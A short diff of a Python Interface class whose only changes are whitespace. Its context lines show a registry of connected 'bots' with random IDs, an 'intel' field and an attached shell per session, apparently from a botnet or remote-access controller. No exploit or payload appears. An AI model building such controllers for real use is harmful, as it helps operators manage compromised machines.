@@ -55,7 +55,7 @@ class Interface(object):
   while 1:
    found = False 
    bot_id = sha256(urandom(64 * 32) + urandom(64 * 64)).digest().hex()
-
+   
    for bot in self.bots:
     if self.bots[bot]['bot_id'] == bot_id:
      found = True 
@@ -72,7 +72,7 @@ class Interface(object):
    bot_id = bot_id[:4] + bot_id[-4:]
    bots += bot_id.encode()
   return sha256(bots).digest().hex()
-  
+    
  def connect_client(self, sess_obj, conn_info, shell):
   self.bots[sess_obj] = { 'bot_id': self.bot_id, 'intel': conn_info['args'], 'shell': shell, 'session': sess_obj }
   self.sig = self.signature  
